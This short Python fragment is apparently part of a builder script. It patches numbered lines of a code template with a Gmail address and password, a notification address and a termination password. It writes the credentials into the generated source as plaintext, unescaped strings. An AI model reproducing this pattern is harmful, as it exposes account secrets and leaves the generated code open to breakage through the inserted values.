...
if GMAIL_LSA != "": RAWUA[59] = "            email = "+ chr(34) + GMAIL_LSA + chr(34) + "\n"
if GMAIL_LSA_PASS != "": RAWUA[60] = "            password = "+ chr(34) + GMAIL_LSA_PASS + chr(34 )+ "\n"
if NOFITY_EMAIL != "": RAWUA[61] = "            send_to_email = "+ chr(34) + NOFITY_EMAIL + chr(34) + "\n"
if TERMINATION_PASS != "": RAWUA[104] = "        if auth == "+ chr(34) + TERMINATION_PASS + chr(34) + " and Notification_Timer_on:" + "\n"
